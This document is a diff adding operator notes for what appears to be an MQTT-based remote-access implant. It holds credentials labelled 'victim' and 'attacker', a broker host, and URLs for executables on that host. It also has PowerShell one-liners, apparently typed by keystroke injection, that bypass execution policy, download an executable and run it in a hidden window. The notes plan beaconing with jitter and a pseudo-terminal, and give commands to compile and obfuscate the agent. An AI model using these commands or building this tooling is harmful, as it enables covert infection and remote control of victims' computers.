@@ -1,0 +1,36 @@
+phlipant:horang0rticult5ure -victim
+dirtysphynx:flatbedgiraffe -attacker
+appinfolive.com:8883 - mqtt tcp server w/ ssl
+appinfolive.com:8083 - mqtt websocket server w/ ssl
+
+http://android.appinfolive.com:8080/uURSRnEV/subuac.exe
+\\android.appinfolive.com@80\uURSRnEV\subuac.exe
+
+http://android.appinfolive.com:8080/GkmlcqMg/sub.exe
+\\android.appinfolive.com@80\GkmlcqMg\sub.exe
+
+Execution:
+gui r
+powershell /w 1 /C Set-ExecutionPolicy Bypass;wget http://android.appinfolive.com:8080/xfXjeyQL/sub.exe -o c:\Users\Public\Downloads\sub.exe;c:\Users\Public\Downloads\sub.exe
+
+powershell /w 1 /C Set-ExecutionPolicy Bypass;wget http://android.appinfolive.com:8080/pYNNscvn/sub-par.exe -o c:\Users\Public\Downloads\sub2.exe;c:\Users\Public\Downloads\sub2.exe
+
+Convert to:
+
+pywinpty - or other pseudo terminal
+beacon - set topic for beacons and execute command if flag raised
+Jitter - random time beacon between a set time variable
+mqtt forwarding? - http://www.steves-internet-guide.com/python-mqtt-bridge-project/
+
+Mqtt Server:
+requires mosquitto mqtt http://www.steves-internet-guide.com/mosquitto-broker/
+broker installation https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-the-mosquitto-mqtt-messaging-broker-on-ubuntu-18-04-quickstart
+configuring mqtt tls http://www.steves-internet-guide.com/mosquitto-tls/
+
+
+Agent compilation and obfuscation:
+pyinstaller --onefile --key=xqf59m97wx2btxnb --hidden-import paho.mqtt.client --hidden-import cryptography.fernet test.py --clean
+
+pyarmor obfuscate --advanced 2 --obf-code=2 --exact test.py
+
+pyminify something.py -o output.py
